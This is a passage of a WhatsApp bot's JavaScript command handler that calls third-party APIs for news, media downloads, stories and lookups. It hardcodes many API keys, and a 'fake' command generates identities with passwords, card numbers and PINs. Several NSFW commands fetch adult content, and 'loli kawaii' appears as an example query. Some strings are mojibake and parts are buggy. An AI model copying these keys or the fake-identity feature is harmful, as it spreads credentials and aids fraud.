                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Uploader : ${get_result.author}\n`
                    ini_txt += `Upload : ${get_result.upload}\n`
                    ini_txt += `View : ${get_result.views}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.likes}\n`
                    ini_txt += `Dislike : ${get_result.dislikes}\n`
                    ini_txt += `Comment : ${get_result.comments}\n`
                    ini_txt += "Link : \n"
                    link = get_result.link
                    for (var x of link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await itsmevall.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
case 'covidindo':
case 'Covidindo':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case 'covidglobal':
                case 'Covidglobal':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case 'kodepos':
                case 'Kodepos':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kodepos?apikey=7ef1e86bd8624c0edd8bd386&query=${daerah}`)
                    get_result = get_result.result[0]
                    ini_txt = `Provinsi : ${get_result.province}\n`
                    ini_txt += `Kabupaten : ${get_result.city}\n`
                    ini_txt += `Kecamatan : ${get_result.subdistrict}\n`
                    ini_txt += `Kelurahan : ${get_result.urban}\n`
                    ini_txt += `Kode Pos : ${get_result.postalcode}`
                    reply(ini_txt)
                    break
                case 'jadwalbola':
                case 'Jadwalbola':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwalbola?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = "Jadwal Bola :\n"
                    for (var x of get_result) {
                        ini_txt += `Hari : ${x.hari}\n`
                        ini_txt += `Jam : ${x.jam}\n`
                        ini_txt += `Event : ${x.event}\n`
                        ini_txt += `Match : ${x.match}\n`
                        ini_txt += `TV : ${x.tv}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'indbeasiswa':
                case 'Indbeasiswa':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/indbeasiswa?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = 'Info Beasiswa :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'hoax':
                case 'Hoax':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/turnbackhoax?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = 'Info Hoax :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Posted : ${x.posted}\n`
                        ini_txt += `Description : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'hoax2':
case 'Hoax2':
                    get_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/infohoax`)
                    get_result = get_result.result
                    ini_txt = 'Info Hoax :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Image : ${x.image}\n`
                        ini_txt += `Tag : ${x.tag}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'faktaunik':
                case 'katabijak':
                case 'pantun':
                case 'bucin':
                case 'Faktaunik':
                case 'Katabijak':
                case 'Pantun':
                case 'Bucin':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=7ef1e86bd8624c0edd8bd386`)
                    reply(get_result.result)
                    break
                case 'randomnama':
                case 'Randomnama':
                    anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=7ef1e86bd8624c0edd8bd386`)
                    reply(anu.result)
                    break
case 'shopee':
case 'Shopee':
                    if (args.length == 0) return reply(`Example: ${prefix + command} tas gendong`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/shopee?apikey=7ef1e86bd8624c0edd8bd386&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Shopee Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.name}\n`
                        ini_txt += `Terjual : ${x.sold}\n`
                        ini_txt += `Stock : ${x.stock}\n`
                        ini_txt += `Lokasi : ${x.shop_loc}\n`
                        ini_txt += `Link : ${x.link_produk}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'lk21':
case 'lk21':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=7ef1e86bd8624c0edd8bd386&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await itsmevall.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'drakorongoing':
                case 'Drakorongoing':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/drakorongoing?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'wattpad':
                case 'Wattpad':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpad?apikey=7ef1e86bd8624c0edd8bd386&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    await itsmevall.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'wattpadsearch':
                case 'Wattpadsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=7ef1e86bd8624c0edd8bd386&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'cerpen':
                case 'Cerpen':
                    get_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/cerpen`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.pengarang}\n`
                    ini_txt += `Kategori : ${get_result.kategori}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    reply(ini_txt)
                    break
case 'cersex':
                case 'Cersex':
                    get_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/cersex`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.judul}\n`
                    ini_txt += `Img : ${get_result.img}\n`
                    ini_txt += `Story :\n${get_result.cersex}`
                    reply(ini_txt)
                    break
                case 'ceritahoror':
                case 'Ceritahoror':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await itsmevall.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
case 'jadwaltvnow':
                case 'Jadwaltvnow':
                    get_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/jadwaltvnow`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV Now :\n`
                    for (var x in get_result) {
                        ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'newsinfo':
                case 'Newsinfo':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/newsinfo?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Author : ${x.author}\n`
                        ini_txt += `Source : ${x.source.name}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Published : ${x.publishedAt}\n`
                        ini_txt += `Description : ${x.description}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'mlstalk':
case 'Mlstalk':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 84830127/2169`)
                    ml_id = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${ml_id}?apikey=7ef1e86bd8624c0edd8bd386`)
                    reply(get_result.result)
                    break
case 'kbbi':
case 'Kbbi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} kursi`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=7ef1e86bd8624c0edd8bd386&query=${args.join(" ")}`)
                    lila = get_result.result
                    ini_txt = `\`\`\`Kata : ${lila[0].nama}\`\`\`\n`
                    ini_txt += `\`\`\`Kata Dasar : ${lila[0].kata_dasar}\`\`\`\n`
                    ini_txt += `\`\`\`Pelafalan : ${lila[0].pelafalan}\`\`\`\n`
                    ini_txt += `\`\`\`Bentuk Tidak Baku : ${lila[0].bentuk_tidak_baku}\`\`\`\n\n`
                    for (var x of lila) {
                        ini_txt += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
                        ini_txt += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
                        ini_txt += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
                        ini_txt += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
                        ini_txt += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
                    }
                    reply(ini_txt)
                    break
                    case 'nekopoi':
                    case 'Nekopoi':
                    if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=7ef1e86bd8624c0edd8bd386&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.anime}\n`
                    ini_txt += `Porducers : ${get_result.producers}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Size : ${get_result.size}\n`
                    ini_txt += `Sinopsis : ${get_result.sinopsis}\n`
                    link = get_result.link
                    for (var x in link) {
                        ini_txt += `\n${link[x].name}\n`
                        link_dl = link[x].link
                        for (var y in link_dl) {
                            ini_txt += `${y} - ${link_dl[y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumb)
                    await itsmevall.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    break
                case 'nekopoisearch':
                case 'Nekopoisearch':
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=7ef1e86bd8624c0edd8bd386&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'nhentai':
case 'Nhentai':
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
                    ini_txt += `Title Native : ${get_result.title_native}\n`
                    ini_txt += `Read Online : ${get_result.read}\n`
                    get_info = get_result.info
                    ini_txt += `Parodies : ${get_info.parodies}\n`
                    ini_txt += `Character : ${get_info.characters.join(", ")}\n`
                    ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
                    ini_txt += `Artist : ${get_info.artists}\n`
                    ini_txt += `Group : ${get_info.groups}\n`
                    ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
                    ini_txt += `Categories : ${get_info.categories}\n`
                    ini_txt += `Pages : ${get_info.pages}\n`
                    ini_txt += `Uploaded : ${get_info.uploaded}\n`
                    reply(ini_txt)
                    break
case 'spotify':
case 'Spotify':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotify?apikey=7ef1e86bd8624c0edd8bd386&url=${url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Popularity : ${get_result.popularity}\n`
                    ini_txt += `Preview : ${get_result.preview_url}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await itsmevall.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link)
                    await itsmevall.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: mek })
                    break
                case 'spotifysearch':
                case 'Spotifysearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotifysearch?apikey=7ef1e86bd8624c0edd8bd386&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Artists : ${x.artists}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Preview : ${x.preview_url}\n\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'jooxplay':
                case 'Jooxplay':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jooxplay?apikey=7ef1e86bd8624c0edd8bd386&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.info.song}\n`
                    ini_txt += `Artists : ${get_result.info.singer}\n`
                    ini_txt += `Duration : ${get_result.info.duration}\n`
                    ini_txt += `Album : ${get_result.info.album}\n`
                    ini_txt += `Uploaded : ${get_result.info.date}\n`
                    ini_txt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBuffer(get_result.image)
                    await itsmeval.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    await itsmevall.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: mek })
                    break
case 'jooxplay2':
                case 'Jooxplay2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.zeks.me/api/joox?apikey=apivinz&q=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.info.song}\n`
                    ini_txt += `Artists : ${get_result.info.singer}\n`
                    ini_txt += `Duration : ${get_result.info.duration}\n`
                    ini_txt += `Album : ${get_result.info.album}\n`
                    ini_txt += `Uploaded : ${get_result.info.date}\n`
                    ini_txt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBuffer(get_result.image)
                    await itsmeval.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    await itsmevall.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: mek })
                    break
case 'jarak':
case 'tempat':
case 'Jarak':
case 'Tempat':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jakarta - yogyakarta`)
                    pauls = args.join(" ")
                    teks1 = pauls.split("-")[0].trim()
                    teks2 = pauls.split("-")[1].trim()
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=7ef1e86bd8624c0edd8bd386&kota1=${teks1}&kota2=${teks2}`)
                    x = get_result.result
                    ini_txt = `Informasi Jarak dari ${teks1} ke ${teks2} :\n\n`
                    ini_txt += `\`\`\`รขโยช Asal :\`\`\` ${x.from.name}\n`
                    ini_txt += `\`\`\`รขโยช Garis Lintang :\`\`\` ${x.from.latitude}\n`
                    ini_txt += `\`\`\`รขโยช Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
                    ini_txt += `\`\`\`รขโยช Tujuan :\`\`\` ${x.to.name}\n`
                    ini_txt += `\`\`\`รขโยช Garis Lintang :\`\`\` ${x.to.latitude}\n`
                    ini_txt += `\`\`\`รขโยช Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
                    ini_txt += `\`\`\`รขโยช Jarak Tempuh :\`\`\` ${x.jarak}\n`
                    ini_txt += `\`\`\`รขโยช Waktu Tempuh :\`\`\`\n`
                    ini_txt += `   รขโขยญรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขยย\n`
                    ini_txt += `รขยยรขโยค Kereta Api : ${x.kereta_api}\n`
                    ini_txt += `รขยยรขโยค Pesawat : ${x.pesawat}\n`
                    ini_txt += `รขยยรขโยค Mobil : ${x.mobil}\n`
                    ini_txt += `รขยยรขโยค Motor : ${x.motor}\n`
                    ini_txt += `รขยยรขโยค Jalan Kaki : ${x.jalan_kaki}\n`
                    ini_txt += `   รขโขยฐรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขโโฌรขยย\n`
                    reply(ini_txt)
                    break
case 'genshin':
case 'Genshin':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jean`)
                    hero = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/genshin/${hero}?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.title}\n`
                    ini_txt += `Intro : ${get_result.intro}\n`
                    ini_txt += `Icon : ${get_result.icon}\n`
                    ini_icon = await getBuffer(get_result.cover1)
                    await itsmevall.sendMessage(from, ini_icon, image, { quoted: mek, caption: ini_txt })
                    ini_voice = await getBuffer(get_result.cv[0].audio[0])
                    await itsmevall.sendMessage(from, ini_voice, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })
                    break
case 'ytstalk':
case 'Ytstalk':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jean`)
                    query = args.join(" ")
                    reply(mess.wait)
                    get_result = await fetchJson(`https://bx-hunter.herokuapp.com/api/ytstalk?text=${query}&apikey=Ikyy69`)
                    ini_txt = `Name : ${get_result.channel}\n`
                    ini_txt += `Subscriber : ${get_result.subscriberCount}\n`
                    ini_txt += `Icon : ${get_result.thumb}\n`
                    ini_txt += `Verified : ${get_result.isVerified}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_icon = await getBuffer(get_result.thumb)
                    await itsmevall.sendMessage(from, ini_icon, image, { quoted: mek, caption: ini_txt })
                    break
case 'cuaca':
case 'Cuaca':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args[0]
                    get_result = await fetchJson(`http://zekais-api.herokuapp.com/cuaca?daerah=${daerah}&apikey=vZ7wFVI3`)
                    ini_txt = `Tempat : ${get_result.Nama}\n`
                    ini_txt += `Cuaca : ${get_result.Cuaca}\n`
                    ini_txt += `Angin : ${get_result.Angin}\n`
                    ini_txt += `Description : ${get_result.Keterangan}\n`
                    ini_txt += `Kelembapan : ${get_result.Melembapan}\n`
                    ini_txt += `Suhu : ${get_result.Suhu}\n`
                    ini_txt += `Udara : ${get_result.Udara}\n`
                    await itsmevall.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: mek })
                    reply(ini_txt)
                    break
      case 'twich':  
      case 'Twich':  
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/twichquote`)
                   anu1 = `โป *THWICH* : ${anu.result}`
                   reply(anu1)
                   break                   
                   case 'jadwaltv':
                   case 'Jadwaltv':
                    if (args.length == 0) return reply(`Example: ${prefix + command} gtv`)
                    query = args.join(" ")
                    reply(mess.wait)
                    res = await axios.get(`https://api.zeks.me/api/jadwaltv?apikey=apivinz&channel=${query}`)
                    reply(res.result)
                    break
      case 'fake':  
      case 'Fake':  
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/fake_identity`)
                   anu1 = `โป *NAMA* : ${anu.name}\n`
                   anu1 += `โป *GENDER* : ${anu.gender}\n` 
                   anu1 += `โป *AGE* : ${anu.age}\n`
                   anu1 += `โป *BIRTDAY* : ${anu.birtday}\n`
                   anu1 += `โป *BACHELOR* : ${anu.Bachelor}\n`
                   anu1 += `โป *ADDRESA* : ${anu.address}\n`
                   anu1 += `โป *CODE* : ${anu.zip_code}\n`
                   anu1 += `โป *STATE* : ${anu.state}\n`
                   anu1 += `โป *COUNTRY* : ${anu.country}\n`
                   anu1 += `โป *EMAIL* : ${anu.email}\n`
                   anu1 += `โป *PASS* : ${anu.password}\n` 
                   anu1 += `โป *PHONE* : ${anu.phone}\n` 
                   anu1 += `โป *CARD* : ${anu.card}\n`
                   anu1 += `โป *CODE* : ${anu.code}\n`
                   anu1 += `โป *DATE* : ${anu.date}\n`
                   anu1 += `โป *PIN* : ${anu.pin_code}\n`
                   anu1 += `โป *WEIGHT* : ${anu.weight}\n` 
                   anu1 += `โป *HEIGHT* : ${anu.height}\n` 
                   anu1 += `โป *TYPE* : ${anu.blood_type}\n`
                   anu1 += `โป *STATUS* : ${anu.status}\n`
                   reply(anu1)
                   break
case 'kusonime':  
case 'Kusonime':  
                   if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/kuso?q=${query}`)
                   anu1 = `โป *INFO* : ${anu.sinopsis}\n`
                   reply(anu1)
                   break
      case 'renungan':  
      case 'Renungan':  
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/renungan`)
                   anu1 = `โป *JUDUL* : ${anu.judul}\n`
                   anu1 += `โป *PESAN* : ${anu.pesan}\n`
                   anu1 += `โป *DESC* : ${anu.Isi}\n`
                   reply(anu1)
                   break
       case 'samehadaku':  
       case 'Samehadaku':  
                   if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/samehadaku?q=${query}`)
                   anu2 = await getBuffer(anu.thumb)
                   anu1 = `โป *JUDUL* : ${anu.title}\n`
                   anu1 += `โป *LINK* : ${anu.link}\n`
                   anu1 += `โป *DESK* : ${anu.desc}\n`
                   itsmevall.sendMessage(from, anu2, image, {caption: anu1, quoted: mek })
                   break
case 'tongue':  
case 'Tongue':  
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/tongue_twister`)
                   anu1 = `โป *NIHH* : ${anu.result}`
                   reply(anu1)
                   break
case 'googlesearch':
case 'ggs':
case 'Googlesearch':
case 'Ggs':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/gsearch?apikey=7ef1e86bd8624c0edd8bd386&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Google Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Desc : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'wiki':
case 'Wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break
case 'nickepep': // Update By KATASHI 
case 'Nickepep': // Update By katashi 
					data = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=apivinz`, {method: 'get'})
					teks = '๐ก๐ถ๐ฐ๐ธ ๐๐ฝ๐ฒ๐ฝ\n'
					for (let i of data.result) {
						teks += `*Nick* : ${i}\n\n๐ก๐ถ๐ฐ๐ธ ๐๐ฝ๐ฒ๐ฝ\n`
					}
					reply(teks.trim())
					
					break
case 'urlshort': //By katashi
case 'url': //By katashi
case 'Urlshort': //By katashi
case 'Url': //By katashi
                         if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
anu = await fetchJson(`https://api.zeks.xyz/api/urlshort?url=${query}&apikey=apivinz`, {method: 'get'})
teks = `${anu.result}`
itsmevall.sendMessage(from, teks, text, {quoted: mek})
break
case 'ppcp': //By katashi
case 'Ppcp': //By katashi
case 'ppcouple': //By katashi
case 'Ppcouple': //By katashi
reply(mess.wait)
anu = await fetchJson(`https://dapuhy-api.herokuapp.com/api/randomimage/couple?apikey=RSWX4evmQEmItxR`, {method: 'get'})
image1 = await getBuffer(anu.result.pria)
image2 = await getBuffer(anu.result.wanita)
itsmevall.sendMessage(from, image1, image, {quoted: mek})
itsmevall.sendMessage(from, image2, image, {quoted: mek})
break

case 'ytdl':
case 'ytdlmp4':
case 'Ytdl':
case 'Ytdlmp4':
if (!c) return reply('Linknya?')
x = await fetchJson(`https://dapuhy-api.herokuapp.com/api/socialmedia/ytplaymp4?query=${c}&apikey=RSWX4evmQEmItxR`)
reply(mess.wait)
vid = await getBuffer(x.url)
itsmevall.sendMessage(from, vid, video, {quoted: mek})
break
case 'tiktokdl':
case 'tiktok2':
case 'Tiktokdl':
case 'Tiktok2':
if (!c) return reply('Linknya?')
x = await fetchJson(`https://dapuhy-api.herokuapp.com/api/socialmedia/ttdownloader?url=${c}&apikey=RSWX4evmQEmItxR`)
reply(mess.wait)
vid = await getBuffer(x.result.nowm)
au = await getBuffer(x.result.audio)
itsmevall.sendMessage(from, vid, video, {quoted: mek})
itsmevall.sendMessage(from, au, audio, {quoted: mek})
break
case 'urlshort2': //By katashi
case 'url2': //By katashi
case 'Urlshort2': //By katashi
case 'Url2': //By katashi
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
anu = await fetchJson(`https://dapuhy-api.herokuapp.com/api/others/cuttly?url=${query}&apikey=RSWX4evmQEmItxR`, {method: 'get'})
